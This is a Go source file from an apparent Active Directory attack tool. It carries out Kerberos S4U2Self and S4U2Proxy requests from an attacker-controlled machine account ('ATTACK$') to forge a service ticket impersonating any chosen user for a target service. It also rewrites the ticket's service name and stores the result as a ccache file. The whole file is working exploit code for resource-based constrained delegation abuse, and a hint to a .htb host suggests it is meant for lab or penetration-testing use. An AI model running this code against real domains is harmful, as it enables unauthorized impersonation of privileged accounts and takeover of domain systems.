package krb

import (
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/chksumtype"
	"github.com/jcmturner/gokrb5/v8/iana/errorcode"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/flags"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/iana/patype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// CNameInAdditionalTkt is KDC option 14 (S4U2Proxy / cname-in-addl-tkt).
const CNameInAdditionalTkt = 14

// S4UOptions is S4U2Self + S4U2Proxy with an AES machine TGT.
type S4UOptions struct {
	Domain      string
	Username    string // machine account (ATTACK$)
	Password    string
	KDC         string
	Impersonate string
	SPN         string // cifs/host or host/host
	AltService  string // getST -altservice: rewrite ticket sname (e.g. CIFS/DC01)
	Dir         string
}

// S4U requests an AES TGT for the machine, S4U2Self, then S4U2Proxy for SPN.
// RC4 TGTs and service tickets are refused.
func S4U(opts S4UOptions) (TicketMeta, error) {
	if err := validateS4U(opts); err != nil {
		return TicketMeta{}, err
	}
	cfg, err := NewConfig(opts.Domain, opts.KDC)
	if err != nil {
		return TicketMeta{}, err
	}
	cfg.LibDefaults.Forwardable = true
	cfg.LibDefaults.NoAddresses = true
	user := samOnly(opts.Username)
	realm := Realm(opts.Domain)
	asRep, err := asExchange(opts.KDC, opts.Domain, user, opts.Password)
	if err != nil {
		return TicketMeta{}, fmt.Errorf("AS-REQ (machine TGT): %w", err)
	}
	tgt := asRep.Ticket
	skey := asRep.DecryptedEncPart.Key
	cname := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, user)
	selfName := types.PrincipalName{NameType: nametype.KRB_NT_PRINCIPAL, NameString: []string{user}}
	imp := types.PrincipalName{NameType: nametype.KRB_NT_PRINCIPAL, NameString: []string{samOnly(opts.Impersonate)}}
	selfReq, err := messages.NewTGSReq(cname, realm, cfg, tgt, skey, selfName, false)
	if err != nil {
		return TicketMeta{}, fmt.Errorf("S4U2Self TGS-REQ: %w", err)
	}
	types.SetFlag(&selfReq.ReqBody.KDCOptions, flags.Forwardable)
	if err := restampTGSPAData(&selfReq, tgt, skey); err != nil {
		return TicketMeta{}, err
	}
	pa, err := marshalPAForUser(imp, realm, skey)
	if err != nil {
		return TicketMeta{}, err
	}
	selfReq.PAData = append(selfReq.PAData, pa)
	selfRep, err := tgsExchange(opts.KDC, selfReq, tgt, skey)
	if err != nil {
		return TicketMeta{}, fmt.Errorf("S4U2Self: %w", err)
	}
	if err := requireImpersonated(selfRep.CName, opts.Impersonate); err != nil {
		return TicketMeta{}, fmt.Errorf("S4U2Self: %w", err)
	}
	if !types.IsFlagSet(&selfRep.DecryptedEncPart.Flags, flags.Forwardable) {
		return TicketMeta{}, fmt.Errorf("S4U2Self ticket is not forwardable")
	}
	spn, err := parseSPN(opts.SPN)
	if err != nil {
		return TicketMeta{}, err
	}
	proxyReq, err := messages.NewTGSReq(cname, realm, cfg, tgt, skey, spn, false)
	if err != nil {
		return TicketMeta{}, fmt.Errorf("S4U2Proxy TGS-REQ: %w", err)
	}
	types.SetFlag(&proxyReq.ReqBody.KDCOptions, flags.Forwardable)
	types.SetFlag(&proxyReq.ReqBody.KDCOptions, CNameInAdditionalTkt)
	proxyReq.ReqBody.AdditionalTickets = []messages.Ticket{selfRep.Ticket}
	paOpt, err := marshalPAPacOptionsRBCD()
	if err != nil {
		return TicketMeta{}, err
	}
	proxyReq.PAData = append(proxyReq.PAData, paOpt)
	if err := restampTGSPAData(&proxyReq, tgt, skey); err != nil {
		return TicketMeta{}, err
	}
	proxyRep, err := tgsExchange(opts.KDC, proxyReq, tgt, skey)
	if err != nil {
		if strings.Contains(err.Error(), "KDC_ERR_BADOPTION") {
			return TicketMeta{}, fmt.Errorf("S4U2Proxy: %w (PAC-OPTIONS sent; SPN not allowed to delegate or TGT not forwardable)", err)
		}
		return TicketMeta{}, fmt.Errorf("S4U2Proxy: %w", err)
	}
	if err := requireAES(proxyRep.DecryptedEncPart.Key.KeyType, "S4U service ticket"); err != nil {
		return TicketMeta{}, err
	}
	if err := requireImpersonated(proxyRep.CName, opts.Impersonate); err != nil {
		return TicketMeta{}, fmt.Errorf("S4U2Proxy: %w", err)
	}
	return storeS4UTicket(opts, proxyRep)
}

func validateS4U(opts S4UOptions) error {
	if opts.Domain == "" || opts.Username == "" || opts.KDC == "" {
		return fmt.Errorf("--domain --user --dc required")
	}
	if opts.Password == "" {
		return fmt.Errorf("--pass-file required (AES machine password; RC4/hash not offered)")
	}
	if strings.TrimSpace(opts.Impersonate) == "" {
		return fmt.Errorf("--impersonate required")
	}
	if strings.TrimSpace(opts.SPN) == "" {
		return fmt.Errorf("--spn required (e.g. cifs/dc.domain.htb)")
	}
	if alt := strings.TrimSpace(opts.AltService); alt != "" {
		if _, _, err := parseSPNWithRealm(alt); err != nil {
			return err
		}
	}
	return nil
}

func requireAES(et int32, what string) error {
	if et != etypeID.AES256_CTS_HMAC_SHA1_96 && et != etypeID.AES128_CTS_HMAC_SHA1_96 {
		return fmt.Errorf("%s etype=%d (want AES128/256); RC4 refused", what, et)
	}
	return nil
}

func tgsExchange(kdc string, req messages.TGSReq, tgt messages.Ticket, skey types.EncryptionKey) (messages.TGSRep, error) {
	rep, err := sendTGS(kdc, req, skey)
	if err == nil {
		return rep, nil
	}
	ke, ok := asKRBError(err, nil)
	if !ok || ke.ErrorCode != errorcode.KRB_AP_ERR_SKEW {
		return rep, wrapKRB(err)
	}
	ApplySKEW(ke)
	if err := restampTGSPAData(&req, tgt, skey); err != nil {
		return rep, err
	}
	rep, err = sendTGS(kdc, req, skey)
	if err != nil {
		return rep, wrapKRB(err)
	}
	return rep, nil
}

func sendTGS(kdc string, req messages.TGSReq, skey types.EncryptionKey) (messages.TGSRep, error) {
	var rep messages.TGSRep
	raw, err := req.Marshal()
	if err != nil {
		return rep, err
	}
	body, err := SendKDC(kdc, raw)
	if err != nil {
		return rep, err
	}
	if err := rep.Unmarshal(body); err != nil {
		if ke, ok := asKRBError(err, body); ok {
			return rep, ke
		}
		return rep, err
	}
	if err := rep.DecryptEncPart(skey); err != nil {
		return rep, fmt.Errorf("decrypt TGS-REP: %w", err)
	}
	if rep.DecryptedEncPart.Nonce != req.ReqBody.Nonce {
		return rep, fmt.Errorf("TGS nonce mismatch")
	}
	return rep, nil
}

type paForUserEnc struct {
	UserName    types.PrincipalName `asn1:"explicit,tag:0"`
	UserRealm   string              `asn1:"generalstring,explicit,tag:1"`
	Cksum       types.Checksum      `asn1:"explicit,tag:2"`
	AuthPackage string              `asn1:"generalstring,explicit,tag:3"`
}

func marshalPAForUser(user types.PrincipalName, realm string, skey types.EncryptionKey) (types.PAData, error) {
	et, err := crypto.GetChksumEtype(chksumtype.KERB_CHECKSUM_HMAC_MD5)
	if err != nil {
		return types.PAData{}, err
	}
	sum, err := et.GetChecksumHash(skey.KeyValue, s4uByteArray(user, realm), keyusage.KERB_NON_KERB_CKSUM_SALT)
	if err != nil {
		return types.PAData{}, fmt.Errorf("PA-FOR-USER checksum: %w", err)
	}
	enc := paForUserEnc{
		UserName:    user,
		UserRealm:   realm,
		Cksum:       types.Checksum{CksumType: chksumtype.KERB_CHECKSUM_HMAC_MD5, Checksum: sum},
		AuthPackage: "Kerberos",
	}
	b, err := asn1.Marshal(enc)
	if err != nil {
		return types.PAData{}, fmt.Errorf("PA-FOR-USER: %w", err)
	}
	return types.PAData{PADataType: patype.PA_FOR_USER, PADataValue: b}, nil
}

func s4uByteArray(user types.PrincipalName, realm string) []byte {
	var b []byte
	var nt [4]byte
	binary.LittleEndian.PutUint32(nt[:], uint32(user.NameType))
	b = append(b, nt[:]...)
	for _, p := range user.NameString {
		b = append(b, p...)
	}
	b = append(b, realm...)
	b = append(b, "Kerberos"...)
	return b
}

func parseSPN(spn string) (types.PrincipalName, error) {
	spn = strings.TrimSpace(spn)
	if i := strings.Index(spn, "@"); i >= 0 {
		spn = spn[:i]
	}
	if !strings.Contains(spn, "/") {
		return types.PrincipalName{}, fmt.Errorf("spn %q: want SERVICE/host", spn)
	}
	return types.NewPrincipalName(nametype.KRB_NT_SRV_INST, spn), nil
}

func requireImpersonated(pn types.PrincipalName, want string) error {
	got := ""
	if len(pn.NameString) > 0 {
		got = samOnly(pn.NameString[0])
	}
	if !strings.EqualFold(got, samOnly(want)) {
		return fmt.Errorf("ticket cname %q is not impersonated user %q", got, samOnly(want))
	}
	return nil
}

func samOnly(s string) string {
	s = strings.TrimSpace(s)
	if i := strings.LastIndex(s, `\`); i >= 0 {
		s = s[i+1:]
	}
	if i := strings.Index(s, "@"); i >= 0 {
		s = s[:i]
	}
	return s
}

func storeS4UTicket(opts S4UOptions, rep messages.TGSRep) (TicketMeta, error) {
	tktBytes, err := rep.Ticket.Marshal()
	if err != nil {
		return TicketMeta{}, err
	}
	enc := rep.DecryptedEncPart
	server := enc.SName.NameString
	srealm := enc.SRealm
	if alt := strings.TrimSpace(opts.AltService); alt != "" {
		rewritten, pn, realm, rerr := RewriteTicketSName(tktBytes, alt)
		if rerr != nil {
			return TicketMeta{}, rerr
		}
		tktBytes = rewritten
		server = pn.NameString
		if realm != "" {
			srealm = realm
		}
	}
	cc, err := WriteCCache(CCacheCred{
		ClientRealm: rep.CRealm,
		Client:      rep.CName.NameString,
		ServerRealm: srealm,
		Server:      server,
		KeyType:     enc.Key.KeyType,
		Key:         enc.Key.KeyValue,
		AuthTime:    enc.AuthTime,
		StartTime:   enc.StartTime,
		EndTime:     enc.EndTime,
		RenewTill:   enc.RenewTill,
		Flags:       bitStringUint32(enc.Flags.Bytes),
		Ticket:      tktBytes,
	})
	if err != nil {
		return TicketMeta{}, err
	}
	dir := opts.Dir
	if dir == "" {
		dir = DefaultTicketDir()
	}
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return TicketMeta{}, err
	}
	id, err := newTicketID()
	if err != nil {
		return TicketMeta{}, err
	}
	ccPath := filepath.Join(dir, id+".ccache")
	if err := os.WriteFile(ccPath, cc, 0o600); err != nil {
		return TicketMeta{}, err
	}
	meta := TicketMeta{
		ID:        id,
		Principal: strings.Join(rep.CName.NameString, "/"),
		Realm:     rep.CRealm,
		Server:    strings.Join(server, "/") + "@" + srealm,
		EType:     enc.Key.KeyType,
		End:       enc.EndTime,
		Source:    "s4u",
		CCache:    ccPath,
	}
	if err := writeMeta(dir, meta); err != nil {
		return TicketMeta{}, err
	}
	return meta, nil
}
